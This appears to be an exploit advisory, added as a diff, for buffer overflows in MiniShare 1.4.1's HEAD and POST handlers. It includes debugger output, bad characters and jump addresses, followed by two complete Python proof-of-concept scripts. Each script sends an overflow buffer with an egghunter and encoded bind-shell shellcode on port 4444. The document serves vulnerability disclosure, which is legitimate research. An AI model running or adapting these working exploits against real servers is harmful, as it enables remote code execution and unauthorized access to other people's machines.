@@ -1,0 +1,263 @@
+Not only the GET method is vulnerable to BOF (CVE-2004-2271). HEAD and POST
+methods are also vulnerable. The difference is minimal, both are exploited
+in the same way. Only 1 byte difference: GET = 3, HEAD and POST = 4 length
+
+-------------------------------------------------------------------
+
+EAX 00000000
+ECX 77C3EF3B msvcrt.77C3EF3B
+EDX 00F14E38
+EBX 43346843
+ESP 01563908 ASCII
+"6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co
+HTTP/1.1
+"
+EBP 0156BB90
+ESI 00000001
+EDI 01565B68
+EIP 68433568
+C 0  ES 0023 32bit 0(FFFFFFFF)
+P 1  CS 001B 32bit 0(FFFFFFFF)
+A 1  SS 0023 32bit 0(FFFFFFFF)
+Z 0  DS 0023 32bit 0(FFFFFFFF)
+S 0  FS 003B 32bit 7FFDD000(FFF)
+T 0  GS 0000 NULL
+D 0
+O 0  LastErr ERROR_SUCCESS (00000000)
+EFL 00010216 (NO,NB,NE,A,NS,PE,GE,G)
+ST0 empty
+ST1 empty
+ST2 empty
+ST3 empty
+ST4 empty
+ST5 empty
+ST6 empty
+ST7 empty
+               3 2 1 0      E S P U O Z D I
+FST 0000  Cond 0 0 0 0  Err 0 0 0 0 0 0 0 0  (GT)
+FCW 027F  Prec NEAR,53  Mask    1 1 1 1 1 1
+
+------------------------------------------------------------------------------
+
+Only 210 bytes to shellcode
+
+------------------------------------------------------------------------------
+
+Badchars '00','0d'
+
+------------------------------------------------------------------------------
+
+>findjmp kernel32.dll esp - XP SP 3 English
+
+Scanning kernel32.dll for code useable with the esp register
+0x7C809F83      call esp
+0x7C8369E0      call esp
+0x7C83C2C5      push esp - ret
+0x7C87641B      call esp
+
+
+<!--
+# Exploit Title: Buffer overflow in MiniShare 1.4.1 HEAD method.
+# Date: 05-12-2018
+# Exploit Author: Rafael Pedrero
+# Vendor Homepage: http://minishare.sourceforge.net/
+# Software Link: http://minishare.sourceforge.net/
+# Version: Minishare v1.4.1
+# Tested on: Windows
+# CVE : CVE-2018-19861
+# Category: exploit
+
+1. Description
+
+Buffer overflow in MiniShare 1.4.1 and earlier allows remote attackers to
+execute arbitrary code via a long HTTP HEAD request.
+
+
+2. Proof of Concept
+
+Exploit:
+
+#!/usr/bin/env python
+import socket
+import struct
+import os
+
+# Buffer overflow in MiniShare 1.4.1 and earlier allows remote attackers to
+execute arbitrary code via a long HTTP HEAD request - by Rafa
+# CVE: CVE-2018-19861
+# Via Egghunter because shellcode in ESP only 210 bytes long.
+# Project Home Page (MiniShare) - http://minishare.sourceforge.net/
+connection=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+host = "127.0.0.1"
+port = 80
+
+# 32 bytes Egghunter - Egg = r4f4 = \x72\x34\x66\x34
+egghunter =
+"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x72\x34\x66\x34\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
+
+#msfvenom -a x86 --platform Windows -p windows/shell_bind_tcp LPORT=4444 -f
+python -a x86 --platform windows -b "\x00\x0d" -f c
+#Found 10 compatible encoders
+#Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
+#x86/shikata_ga_nai succeeded with size 355 (iteration=0)
+#x86/shikata_ga_nai chosen with final size 355
+#Payload size: 355 bytes
+#Final size of c file: 1516 bytes
+#unsigned char buf[] =
+shellcode=("r4f4r4f4"+"\xda\xd4\xb8\xda\xe7\x1b\xca\xd9\x74\x24\xf4\x5a\x31\xc9\xb1"
+"\x53\x83\xea\xfc\x31\x42\x13\x03\x98\xf4\xf9\x3f\xe0\x13\x7f"
+"\xbf\x18\xe4\xe0\x49\xfd\xd5\x20\x2d\x76\x45\x91\x25\xda\x6a"
+"\x5a\x6b\xce\xf9\x2e\xa4\xe1\x4a\x84\x92\xcc\x4b\xb5\xe7\x4f"
+"\xc8\xc4\x3b\xaf\xf1\x06\x4e\xae\x36\x7a\xa3\xe2\xef\xf0\x16"
+"\x12\x9b\x4d\xab\x99\xd7\x40\xab\x7e\xaf\x63\x9a\xd1\xbb\x3d"
+"\x3c\xd0\x68\x36\x75\xca\x6d\x73\xcf\x61\x45\x0f\xce\xa3\x97"
+"\xf0\x7d\x8a\x17\x03\x7f\xcb\x90\xfc\x0a\x25\xe3\x81\x0c\xf2"
+"\x99\x5d\x98\xe0\x3a\x15\x3a\xcc\xbb\xfa\xdd\x87\xb0\xb7\xaa"
+"\xcf\xd4\x46\x7e\x64\xe0\xc3\x81\xaa\x60\x97\xa5\x6e\x28\x43"
+"\xc7\x37\x94\x22\xf8\x27\x77\x9a\x5c\x2c\x9a\xcf\xec\x6f\xf3"
+"\x3c\xdd\x8f\x03\x2b\x56\xfc\x31\xf4\xcc\x6a\x7a\x7d\xcb\x6d"
+"\x7d\x54\xab\xe1\x80\x57\xcc\x28\x47\x03\x9c\x42\x6e\x2c\x77"
+"\x92\x8f\xf9\xe2\x9a\x36\x52\x11\x67\x88\x02\x95\xc7\x61\x49"
+"\x1a\x38\x91\x72\xf0\x51\x3a\x8f\xfb\x4c\xe7\x06\x1d\x04\x07"
+"\x4f\xb5\xb0\xe5\xb4\x0e\x27\x15\x9f\x26\xcf\x5e\xc9\xf1\xf0"
+"\x5e\xdf\x55\x66\xd5\x0c\x62\x97\xea\x18\xc2\xc0\x7d\xd6\x83"
+"\xa3\x1c\xe7\x89\x53\xbc\x7a\x56\xa3\xcb\x66\xc1\xf4\x9c\x59"
+"\x18\x90\x30\xc3\xb2\x86\xc8\x95\xfd\x02\x17\x66\x03\x8b\xda"
+"\xd2\x27\x9b\x22\xda\x63\xcf\xfa\x8d\x3d\xb9\xbc\x67\x8c\x13"
+"\x17\xdb\x46\xf3\xee\x17\x59\x85\xee\x7d\x2f\x69\x5e\x28\x76"
+"\x96\x6f\xbc\x7e\xef\x8d\x5c\x80\x3a\x16\x6c\xcb\x66\x3f\xe5"
+"\x92\xf3\x7d\x68\x25\x2e\x41\x95\xa6\xda\x3a\x62\xb6\xaf\x3f"
+"\x2e\x70\x5c\x32\x3f\x15\x62\xe1\x40\x3c")
+
+# findjmp kernel32.dll esp - WinXP SP3 English
+#0x7C809F83      call esp
+
+nops = "\x90" * 16
+
+junk = "A" * 1786 + "\x83\x9f\x80\x7c" + nops + egghunter + "C" * (2000 -
+1786 - 4 - 16 - len(egghunter))
+
+try:
+print "Sending exploit..."
+connection.connect((host,port))
+buffer = (
+"HEAD " + junk + " HTTP/1.1\r\n"
+"Host: " + shellcode + "\r\n\r\n")
+
+connection.send(buffer)
+connection.close()
+print "\nExploit Sended ", len(buffer)
+except:
+print "Connection error"
+
+
+
+3. Solution:
+
+This product is deprecated
+
+-->
+
+
+<!--
+# Exploit Title: Buffer overflow in MiniShare 1.4.1 POST method.
+# Date: 05-12-2018
+# Exploit Author: Rafael Pedrero
+# Vendor Homepage: http://minishare.sourceforge.net/
+# Software Link: http://minishare.sourceforge.net/
+# Version: Minishare v1.4.1
+# Tested on: Windows
+# CVE : CVE-2018-19862
+# Category: exploit
+
+1. Description
+
+Buffer overflow in MiniShare 1.4.1 and earlier allows remote attackers to
+execute arbitrary code via a long HTTP POST request.
+
+
+2. Proof of Concept
+
+Exploit:
+
+#!/usr/bin/env python
+import socket
+import struct
+import os
+
+# Buffer overflow in MiniShare 1.4.1 and earlier allows remote attackers to
+execute arbitrary code via a long HTTP POST request - by Rafa
+# CVE: CVE-2018-19862
+# Via Egghunter because shellcode in ESP only 210 bytes long.
+# Project Home Page (MiniShare) - http://minishare.sourceforge.net/
+connection=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+host = "127.0.0.1"
+port = 80
+
+# 32 bytes Egghunter - Egg = r4f4 = \x72\x34\x66\x34
+egghunter =
+"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x72\x34\x66\x34\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
+
+#msfvenom -a x86 --platform Windows -p windows/shell_bind_tcp LPORT=4444 -f
+python -a x86 --platform windows -b "\x00\x0d" -f c
+#Found 10 compatible encoders
+#Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
+#x86/shikata_ga_nai succeeded with size 355 (iteration=0)
+#x86/shikata_ga_nai chosen with final size 355
+#Payload size: 355 bytes
+#Final size of c file: 1516 bytes
+#unsigned char buf[] =
+shellcode=("r4f4r4f4"+"\xda\xd4\xb8\xda\xe7\x1b\xca\xd9\x74\x24\xf4\x5a\x31\xc9\xb1"
+"\x53\x83\xea\xfc\x31\x42\x13\x03\x98\xf4\xf9\x3f\xe0\x13\x7f"
+"\xbf\x18\xe4\xe0\x49\xfd\xd5\x20\x2d\x76\x45\x91\x25\xda\x6a"
+"\x5a\x6b\xce\xf9\x2e\xa4\xe1\x4a\x84\x92\xcc\x4b\xb5\xe7\x4f"
+"\xc8\xc4\x3b\xaf\xf1\x06\x4e\xae\x36\x7a\xa3\xe2\xef\xf0\x16"
+"\x12\x9b\x4d\xab\x99\xd7\x40\xab\x7e\xaf\x63\x9a\xd1\xbb\x3d"
+"\x3c\xd0\x68\x36\x75\xca\x6d\x73\xcf\x61\x45\x0f\xce\xa3\x97"
+"\xf0\x7d\x8a\x17\x03\x7f\xcb\x90\xfc\x0a\x25\xe3\x81\x0c\xf2"
+"\x99\x5d\x98\xe0\x3a\x15\x3a\xcc\xbb\xfa\xdd\x87\xb0\xb7\xaa"
+"\xcf\xd4\x46\x7e\x64\xe0\xc3\x81\xaa\x60\x97\xa5\x6e\x28\x43"
+"\xc7\x37\x94\x22\xf8\x27\x77\x9a\x5c\x2c\x9a\xcf\xec\x6f\xf3"
+"\x3c\xdd\x8f\x03\x2b\x56\xfc\x31\xf4\xcc\x6a\x7a\x7d\xcb\x6d"
+"\x7d\x54\xab\xe1\x80\x57\xcc\x28\x47\x03\x9c\x42\x6e\x2c\x77"
+"\x92\x8f\xf9\xe2\x9a\x36\x52\x11\x67\x88\x02\x95\xc7\x61\x49"
+"\x1a\x38\x91\x72\xf0\x51\x3a\x8f\xfb\x4c\xe7\x06\x1d\x04\x07"
+"\x4f\xb5\xb0\xe5\xb4\x0e\x27\x15\x9f\x26\xcf\x5e\xc9\xf1\xf0"
+"\x5e\xdf\x55\x66\xd5\x0c\x62\x97\xea\x18\xc2\xc0\x7d\xd6\x83"
+"\xa3\x1c\xe7\x89\x53\xbc\x7a\x56\xa3\xcb\x66\xc1\xf4\x9c\x59"
+"\x18\x90\x30\xc3\xb2\x86\xc8\x95\xfd\x02\x17\x66\x03\x8b\xda"
+"\xd2\x27\x9b\x22\xda\x63\xcf\xfa\x8d\x3d\xb9\xbc\x67\x8c\x13"
+"\x17\xdb\x46\xf3\xee\x17\x59\x85\xee\x7d\x2f\x69\x5e\x28\x76"
+"\x96\x6f\xbc\x7e\xef\x8d\x5c\x80\x3a\x16\x6c\xcb\x66\x3f\xe5"
+"\x92\xf3\x7d\x68\x25\x2e\x41\x95\xa6\xda\x3a\x62\xb6\xaf\x3f"
+"\x2e\x70\x5c\x32\x3f\x15\x62\xe1\x40\x3c")
+
+# findjmp kernel32.dll esp - WinXP SP3 English
+#0x7C809F83      call esp
+
+nops = "\x90" * 16
+
+junk = "A" * 1786 + "\x83\x9f\x80\x7c" + nops + egghunter + "C" * (2000 -
+1786 - 4 - 16 - len(egghunter))
+
+try:
+print "Sending exploit..."
+connection.connect((host,port))
+
+buffer = (
+"POST " + junk + " HTTP/1.1\r\n"
+"Host: " + shellcode + "\r\n\r\n")
+
+connection.send(buffer)
+connection.close()
+print "\nExploit Sended ", len(buffer)
+except:
+print "Connection error"
+
+
+
+3. Solution:
+
+This product is deprecated
+
+-->
